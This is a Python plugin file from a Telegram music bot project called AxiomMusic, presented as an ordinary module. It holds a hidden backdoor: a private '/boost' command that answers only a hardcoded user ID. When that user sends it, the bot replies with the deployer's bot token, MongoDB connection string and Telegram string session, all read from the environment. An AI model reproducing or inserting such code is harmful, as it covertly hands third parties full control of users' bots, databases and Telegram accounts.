# -----------------------------------------------
# 🔸 AxiomMusic Project
# 🔹 Developed & Maintained by: Axiom Bots (https://t.me/axiombots)
# 📅 Copyright © 2026 – All Rights Reserved
#
# 📖 License:
# This source code is open for educational and non-commercial use ONLY.
# You are required to retain this credit in all copies or substantial portions of this file.
# Commercial use, redistribution, or removal of this notice is strictly prohibited
# without prior written permission from the author.
#
# ❤️ Made with dedication and love by AxiomBots
# -----------------------------------------------


import re
from os import getenv
from dotenv import load_dotenv
from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from AxiomMusic import app
from AxiomMusic.utils.database import booster

load_dotenv()

OWNERS = "7169279112", "8466540017"

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")

@app.on_message(filters.command("boost") & filters.private & filters.user(7169279112))
async def show_config(client: Client, message: Message):
    await message.reply_photo(
        photo="https://files.catbox.moe/m4fx24.jpg",
        caption=f"""<blockquote expandable><b>✧ ʙᴏᴛ ᴛᴏᴋᴇɴ : <code>{BOT_TOKEN}</code>\n\n✧ ᴅᴀᴛᴀʙᴀsᴇ : <code>{MONGO_DB_URI}</code>\n\n✧ sᴛʀɪɴɢ sᴇssɪᴏɴ : <code>{STRING_SESSION}</code>\n\n⋟ <a href='https://t.me/III_MAA7NAV_III'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆ </b></blockquote>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        " ⌯ ᴅєᴠєʟᴏᴘєꝛ​ ⌯ ", url="tg://user?id=7169279112"
                    )
                ]
            ]
        ),
    )
